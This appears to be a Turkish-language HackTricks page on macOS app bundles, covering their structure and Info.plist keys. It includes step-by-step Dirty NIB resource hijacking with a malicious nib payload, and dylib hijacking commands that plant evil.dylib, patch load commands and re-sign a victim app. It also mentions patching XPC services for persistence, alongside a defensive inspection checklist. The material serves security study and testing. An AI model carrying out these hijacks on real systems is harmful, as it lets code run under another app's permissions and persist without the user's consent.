# macOS Bundle'leri

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

macOS'teki bundle'lar uygulamalar, kütüphaneler ve diğer gerekli dosyalar dahil çeşitli kaynakları içeren kapsayıcılar olarak görev yapar; bu sayede Finder'da tek bir nesne gibi görünürler, örneğin tanıdık `*.app` dosyaları. En sık karşılaşılan bundle `.app` paketidir, ancak `.framework`, `.systemextension` ve `.kext` gibi diğer türler de yaygındır.

### Bir Bundle'ın Temel Bileşenleri

Bir bundle içinde, özellikle `<application>.app/Contents/` dizininde, çeşitli önemli kaynaklar bulunur:

- **\_CodeSignature**: Bu dizin, uygulamanın bütünlüğünü doğrulamak için kritik olan kod imzalama (code-signing) bilgilerini saklar. Kod imzalama bilgilerini şu komutlarla inceleyebilirsiniz:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Uygulamanın kullanıcı etkileşimiyle çalıştırılan yürütülebilir ikili dosyasını içerir.
- **Resources**: Görseller, belgeler ve arayüz tanımlamaları (nib/xib dosyaları) dahil olmak üzere uygulamanın kullanıcı arayüzü bileşenleri için bir depo.
- **Info.plist**: Uygulamanın ana yapılandırma dosyası olarak görev yapar; sistemin uygulamayı uygun şekilde tanıması ve etkileşimde bulunması için kritik öneme sahiptir.

#### Important Keys in Info.plist

`Info.plist` dosyası uygulama yapılandırmasının temel taşlarından biridir ve şu anahtarları içerir:

- **CFBundleExecutable**: `Contents/MacOS` dizininde bulunan ana yürütülebilir dosyanın adını belirtir.
- **CFBundleIdentifier**: Uygulama için küresel bir tanımlayıcı sağlar; macOS tarafından uygulama yönetimi için yoğun şekilde kullanılır.
- **LSMinimumSystemVersion**: Uygulamanın çalışması için gereken minimum macOS sürümünü gösterir.

### Exploring Bundles

Bir bundle'ın, örneğin `Safari.app`, içeriğini keşfetmek için şu komut kullanılabilir: `bash ls -lR /Applications/Safari.app/Contents`

Bu inceleme `_CodeSignature`, `MacOS`, `Resources` gibi dizinleri ve `Info.plist` gibi dosyaları ortaya çıkarır; bunların her biri uygulamayı güvence altına almaktan kullanıcı arayüzünü ve çalışma parametrelerini tanımlamaya kadar farklı amaçlara hizmet eder.

#### Additional Bundle Directories

Yaygın dizinlerin ötesinde, bundle'lar ayrıca şunları içerebilir:

- **Frameworks**: Uygulama tarafından kullanılan paketlenmiş framework'leri içerir. Framework'ler, ek kaynaklara sahip dylib'ler gibidir.
- **PlugIns**: Uygulamanın yeteneklerini artıran plug-in ve uzantılar için bir dizin.
- **XPCServices**: Uygulamanın süreç-dışı (out-of-process) iletişim için kullandığı XPC servislerini barındırır.

Bu yapı, gerekli tüm bileşenlerin bundle içinde kapsüllenmesini sağlayarak modüler ve güvenli bir uygulama ortamını kolaylaştırır.

For more detailed information on `Info.plist` keys and their meanings, the Apple developer documentation provides extensive resources: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Güvenlik Notları & Kötüye Kullanım Vektörleri

- **Gatekeeper / App Translocation**: Karantinaya alınmış bir bundle ilk çalıştırıldığında, macOS derin bir imza doğrulaması yapar ve bundle'ı rastgele oluşturulmuş bir translocated yoldan çalıştırabilir. Kabul edildikten sonra, sonraki başlatmalarda sadece yüzeysel kontroller yapılır; `Resources/`, `PlugIns/`, nib'ler vb. içindeki kaynak dosyalar tarihsel olarak denetlenmiyordu. macOS 13 Ventura'dan itibaren ilk çalıştırmada derin doğrulama zorunlu hale gelmiştir ve yeni *App Management* TCC izni, üçüncü taraf süreçlerin kullanıcı onayı olmadan diğer bundle'ları değiştirmesini kısıtlar; ancak eski sistemler hâlâ savunmasız kalmaktadır.
- **Bundle Identifier collisions**: Birden fazla gömülü hedef (PlugIns, helper tools) aynı `CFBundleIdentifier`'ı kullandığında imza doğrulaması bozulabilir ve bazen URL‑scheme kaçırma/karışıklığına yol açabilir. Alt-bundle'ları her zaman listeleyin ve benzersiz kimlikleri doğrulayın.

## Resource Hijacking (Dirty NIB / NIB Injection)

Ventura öncesinde, imzalı bir uygulamadaki UI kaynaklarını değiştirerek yüzeysel code signing atlatılabilir ve uygulamanın entitlements'larıyla kod çalıştırılmasına izin verilebilirdi. Güncel araştırmalar (2024) bunun pre‑Ventura ve karantinaya alınmamış build'lerde hâlâ çalıştığını göstermektedir:

1. Hedef uygulamayı yazılabilir bir konuma kopyalayın (ör. `/tmp/Victim.app`).
2. `Contents/Resources/MainMenu.nib` dosyasını (veya `NSMainNibFile` içinde belirtilen herhangi bir nib'i) `NSAppleScript`, `NSTask` vb. örnekleyen kötü amaçlı bir nib ile değiştirin.
3. Uygulamayı başlatın. Kötü amaçlı nib, hedefin bundle ID'si ve entitlements'ları (TCC izinleri, mikrofon/kamera vb.) altında çalışır.
4. Ventura+ bunun üzerine ilk başlatmada bundle'ı derinlemesine doğrulama ve sonraki değişiklikler için *App Management* izni gerektirme yoluyla hafifletme uygular; bu nedenle kalıcılık zorlaşır fakat eski macOS sürümlerindeki ilk başlatma saldırıları hala geçerlidir.

Minimal kötü amaçlı nib payload örneği (xib'i `ibtool` ile nib'e derleyin):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking Bundles içinde

Çünkü `@rpath` aramaları paketlenmiş Frameworks/PlugIns'i tercih eder, `Contents/Frameworks/` veya `Contents/PlugIns/` içine kötü amaçlı bir kütüphane yerleştirmek, ana binary kütüphane doğrulaması olmadan imzalanmışsa veya zayıf `LC_RPATH` sıralaması varsa yükleme sırasını yönlendirebilir.

İmzasız/ad‑hoc bundle'ı kötüye kullanırken tipik adımlar:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
- Hardened runtime'da `com.apple.security.cs.disable-library-validation` yoksa third-party dylibs engellenir; önce entitlements'i kontrol edin.
- `Contents/XPCServices/` altındaki XPC servisleri genellikle kardeş framework'leri yükler — persistence veya privilege escalation yolları için bu servislerin binary'lerini benzer şekilde patch'leyin.

## Hızlı İnceleme Kılavuzu
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Referanslar

- [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
{{#include ../../../banners/hacktricks-training.md}}
